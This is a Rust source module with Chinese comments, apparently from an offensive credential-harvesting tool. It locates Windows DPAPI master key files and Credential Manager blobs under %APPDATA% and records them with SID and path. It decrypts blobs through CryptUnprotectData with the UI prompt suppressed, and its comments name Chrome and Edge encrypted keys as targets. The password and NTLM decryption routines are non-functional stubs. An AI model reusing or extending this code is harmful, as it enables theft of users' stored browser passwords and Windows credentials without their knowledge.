//! DPAPI (Windows Data Protection API) 解密模块
//!
//! 包括浏览器密码、凭据管理器、证书私钥等。
//! 攻击者如果能获取DPAPI主密钥，就可以解密所有这些数据。
//!
//! 关键文件：
//! - Master Key: %APPDATA%\Microsoft\Protect\{SID}\{GUID}
//! - Credential blob: %APPDATA%\Microsoft\Credentials\*
//! - Preferred: %APPDATA%\Microsoft\Protect\{SID}\Preferred
//!
//! 解密过程：
//! 1. 从用户目录获取Master Key文件
//! 2. 使用用户密码/SID/NT哈希派生密钥
//! 3. 解密Master Key获取Session Key
//! 4. 使用Session Key解密目标blob

use crate::cred::{Credential, CredType};
use serde::{Deserialize, Serialize};

/// DPAPI Master Key 信息
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DpapiMasterKey {
    /// Master Key GUID
    pub key_guid: String,
    /// 最后写入时间
    pub last_write_time: String,
    /// 加密的Master Key数据
    pub encrypted_key: Vec<u8>,
    /// 解密后的Master Key（如果成功）
    pub decrypted_key: Option<Vec<u8>>,
    /// 用户SID
    pub user_sid: Option<String>,
}

/// DPAPI blob
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DpapiBlob {
    /// 数据描述
    pub description: Option<String>,
    /// 加密的数据
    pub encrypted_data: Vec<u8>,
    /// 需要的Master Key GUID
    pub master_key_guid: Option<String>,
    /// 解密后的数据（如果成功）
    pub decrypted_data: Option<Vec<u8>>,
    /// 来源文件路径
    pub source_path: String,
}

/// 收集DPAPI信息并尝试解密
pub fn collect_dpapi_info() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 查找Master Key目录
    let appdata = std::env::var("APPDATA")
        .map(std::path::PathBuf::from)
        .unwrap_or_default();
    let protect_dir = appdata.join("Microsoft").join("Protect");

    if !protect_dir.exists() {
        tracing::debug!("[DPAPI] 未找到Master Key目录");
        return Ok(credentials);
    }

    // 遍历SID子目录
    if let Ok(sid_entries) = std::fs::read_dir(&protect_dir) {
        for sid_entry in sid_entries.flatten() {
            let sid_path = sid_entry.path();
            if !sid_path.is_dir() {
                continue;
            }

            let sid = sid_path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("");

            // 查找Master Key文件（不以Preferred结尾的GUID文件）
            if let Ok(key_entries) = std::fs::read_dir(&sid_path) {
                for key_entry in key_entries.flatten() {
                    let key_path = key_entry.path();
                    if !key_path.is_file() {
                        continue;
                    }

                    let filename = key_path.file_name()
                        .and_then(|n| n.to_str())
                        .unwrap_or("");

                    // Master Key文件是GUID格式（不以Preferred结尾）
                    if is_guid(filename) && filename != "Preferred" {
                        if let Ok(key_data) = std::fs::read(&key_path) {
                            let master_key = parse_master_key(&key_data, filename);

                            credentials.push(
                                Credential::new(CredType::DpapiBlob, "DPAPI Master Key")
                                    .with_target(filename)
                                    .with_attribute("guid", filename)
                                    .with_attribute("user_sid", sid)
                                    .with_attribute("path", &key_path.to_string_lossy())
                                    .with_attribute("key_size", &key_data.len().to_string())
                                    .with_attribute("decrypted", &master_key.decrypted_key.is_some().to_string())
                            );
                        }
                    }
                }
            }
        }
    }

    // 查找凭据管理器blob
    // %APPDATA%\Microsoft\Credentials\
    let cred_dir = appdata.join("Microsoft").join("Credentials");
    if cred_dir.exists() {
        if let Ok(cred_entries) = std::fs::read_dir(&cred_dir) {
            for cred_entry in cred_entries.flatten() {
                let cred_path = cred_entry.path();
                if cred_path.is_file() {
                    if let Ok(cred_data) = std::fs::read(&cred_path) {
                        let blob = parse_credential_blob(&cred_data);

                        credentials.push(
                            Credential::new(CredType::DpapiBlob, "Windows凭据Blob")
                                .with_target(&cred_path.to_string_lossy())
                                .with_attribute("description", &blob.description.unwrap_or_default())
                                .with_attribute("master_key_guid", &blob.master_key_guid.unwrap_or_default())
                                .with_attribute("data_size", &cred_data.len().to_string())
                        );
                    }
                }
            }
        }
    }

    Ok(credentials)
}

/// 解析Master Key文件
fn parse_master_key(data: &[u8], guid: &str) -> DpapiMasterKey {
    // Master Key格式 (简化):
    // [4字节] 版本 (1 或 2)
    // [16字节] Salt
    // [4字节] 迭代次数
    // [16字节] HMAC (SHA1)
    // [可变] 加密的Master Key (AES-256-CBC?)

    let version = if data.len() >= 4 {
        u32::from_le_bytes([data[0], data[1], data[2], data[3]])
    } else {
        1
    };

    let encrypted_key = if data.len() > 56 {
        data[56..].to_vec()
    } else {
        data.to_vec()
    };

    DpapiMasterKey {
        key_guid: guid.to_string(),
        last_write_time: String::new(),
        encrypted_key,
        decrypted_key: None,
        user_sid: None,
    }
}

/// 解析凭据Blob
fn parse_credential_blob(data: &[u8]) -> DpapiBlob {
    // 凭据blob格式 (简化):
    // [可变] 凭据描述 (以\0结尾的Unicode字符串)
    // [可变] Master Key GUID
    // [可变] 加密数据

    // 尝试提取描述（UTF-16LE字符串）
    let mut description = None;
    if data.len() >= 2 {
        let mut chars = Vec::new();
        let mut i = 0;
        while i + 2 <= data.len() {
            let c = u16::from_le_bytes([data[i], data[i + 1]]);
            if c == 0 {
                break;
            }
            if c < 32 || c > 127 {
                break;
            }
            chars.push(c);
            i += 2;
        }
        if !chars.is_empty() {
            description = Some(String::from_utf16_lossy(&chars));
        }
    }

    DpapiBlob {
        description,
        encrypted_data: data.to_vec(),
        master_key_guid: None,
        decrypted_data: None,
        source_path: String::new(),
    }
}

/// 判断字符串是否为GUID格式
fn is_guid(s: &str) -> bool {
    let parts: Vec<&str> = s.split('-').collect();
    if parts.len() != 5 {
        return false;
    }
    let lens = [8, 4, 4, 4, 12];
    parts.iter().zip(lens.iter()).all(|(p, &l)| p.len() == l && p.chars().all(|c| c.is_ascii_hexdigit()))
}

/// 尝试使用用户密码解密Master Key
pub fn decrypt_master_key_with_password(
    master_key: &DpapiMasterKey,
    password: &str,
    sid: &str,
) -> Result<Vec<u8>, String> {
    // PBKDF2-HMAC-SHA1 密钥派生
    // 实际DPAPI使用以下参数:
    // - 密码 + SID作为输入
    // - Salt来自Master Key文件的前16字节
    // - 迭代次数来自Master Key文件
    // - 输出：AES密钥

    // 简化实现（完整实现需要Windows CryptoAPI）
    let _combined = format!("{}{}", password, sid);
    Err("完整DPAPI解密需要Windows CryptoAPI支持".to_string())
}

/// 尝试使用NTLM哈希解密Master Key (适用于域账户)
pub fn decrypt_master_key_with_ntlm(
    master_key: &DpapiMasterKey,
    ntlm_hash: &str,
    sid: &str,
) -> Result<Vec<u8>, String> {
    // 对于域账户，DPAPI使用NTLM哈希作为密钥
    let _combined = format!("{}{}", ntlm_hash, sid);
    Err("完整DPAPI解密需要Windows CryptoAPI支持".to_string())
}

// ============================================================
// DPAPI Blob 解密 (CryptUnprotectData)
// ============================================================

/// Windows CRYPT_INTEGER_BLOB / DATA_BLOB 结构
#[cfg(windows)]
#[repr(C)]
struct CryptDataBlob {
    cb_data: u32,
    pb_data: *mut u8,
}

#[cfg(windows)]
#[link(name = "crypt32")]
extern "system" {
    fn CryptUnprotectData(
        p_data_in: *const CryptDataBlob,
        pp_sz_data_descr: *mut *mut u16,
        p_optional_entropy: *const CryptDataBlob,
        pv_reserved: *mut std::ffi::c_void,
        p_prompt_struct: *const std::ffi::c_void,
        dw_flags: u32,
        p_data_out: *mut CryptDataBlob,
    ) -> i32;
}

#[cfg(windows)]
#[link(name = "kernel32")]
extern "system" {
    fn LocalFree(h_mem: *mut std::ffi::c_void) -> *mut std::ffi::c_void;
}

/// 使用Windows DPAPI (`CryptUnprotectData`) 解密数据blob
///
/// 在当前用户上下文中直接调用，无需额外凭据。
/// 适用于浏览器主密钥（Chrome/Edge `os_crypt.encrypted_key`）、
/// 凭据管理器blob、旧版Chrome v01密码等场景。
#[cfg(windows)]
pub fn decrypt_dpapi_blob(encrypted: &[u8]) -> Result<Vec<u8>, String> {
    use std::ptr;

    let mut data_in_buf = encrypted.to_vec();
    let data_in = CryptDataBlob {
        cb_data: data_in_buf.len() as u32,
        pb_data: data_in_buf.as_mut_ptr(),
    };
    let mut data_out = CryptDataBlob {
        cb_data: 0,
        pb_data: ptr::null_mut(),
    };

    let success = unsafe {
        CryptUnprotectData(
            &data_in,
            ptr::null_mut(),   // ppszDataDescr — 不需要描述
            ptr::null(),       // pOptionalEntropy — 无额外熵
            ptr::null_mut(),   // pvReserved
            ptr::null(),       // pPromptStruct — 不弹出UI提示
            0,                 // dwFlags — 默认（当前用户上下文）
            &mut data_out,
        )
    };

    if success == 0 {
        let err = std::io::Error::last_os_error();
        return Err(format!("CryptUnprotectData 失败: {}", err));
    }

    if data_out.pb_data.is_null() || data_out.cb_data == 0 {
        return Err("CryptUnprotectData 返回空数据".to_string());
    }

    let decrypted = unsafe {
        std::slice::from_raw_parts(data_out.pb_data, data_out.cb_data as usize).to_vec()
    };

    // 释放CryptUnprotectData分配的内存
    unsafe {
        LocalFree(data_out.pb_data as *mut std::ffi::c_void);
    }

    Ok(decrypted)
}

/// DPAPI解密（非Windows平台不可用）
#[cfg(not(windows))]
pub fn decrypt_dpapi_blob(_encrypted: &[u8]) -> Result<Vec<u8>, String> {
    Err("DPAPI解密仅支持Windows平台（需要CryptUnprotectData API）".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_guid() {
        assert!(is_guid("a1b2c3d4-e5f6-7890-abcd-ef1234567890"));
        assert!(!is_guid("not-a-guid"));
        assert!(!is_guid("Preferred"));
        assert!(!is_guid(""));
    }

    #[test]
    fn test_parse_master_key() {
        let data = vec![0u8; 100];
        let mk = parse_master_key(&data, "test-guid");
        assert_eq!(mk.key_guid, "test-guid");
        assert!(mk.decrypted_key.is_none());
    }

    #[test]
    fn test_parse_credential_blob() {
        // 构造简单的blob：UTF-16LE描述 + 数据
        let desc = "test_cred";
        let desc_utf16: Vec<u8> = desc.encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .chain(std::iter::once(0u8).chain(std::iter::once(0u8)))
            .collect();
        let mut blob = desc_utf16;
        blob.extend_from_slice(&[0xAA, 0xBB, 0xCC, 0xDD]);

        let parsed = parse_credential_blob(&blob);
        assert_eq!(parsed.description, Some("test_cred".to_string()));
    }

    #[test]
    fn test_collect_dpapi_info() {
        let result = collect_dpapi_info();
        assert!(result.is_ok());
    }

    #[test]
    fn test_decrypt_dpapi_blob_invalid_data() {
        // 无效数据应返回错误而不是panic
        // Windows: CryptUnprotectData会拒绝非法blob
        // 非Windows: 直接返回平台不支持错误
        let result = decrypt_dpapi_blob(b"invalid_dpapi_data_for_testing");
        assert!(result.is_err());
    }
}
